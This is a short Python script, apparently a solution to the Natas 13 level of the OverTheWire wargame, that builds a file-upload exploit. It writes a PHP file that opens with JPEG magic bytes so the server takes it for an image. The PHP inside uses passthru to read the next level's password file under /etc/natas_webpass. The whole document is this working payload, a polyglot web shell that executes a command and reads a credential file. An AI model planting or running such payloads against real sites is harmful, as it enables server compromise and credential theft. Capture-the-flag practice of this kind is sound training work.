with open("/home/akash/Documents/hA/script.php", "w") as f:
    f.write('\xFF\xD8\xFF\xE0')
    f.write("""<?php
passthru('cat /etc/natas_webpass/natas14');
""")
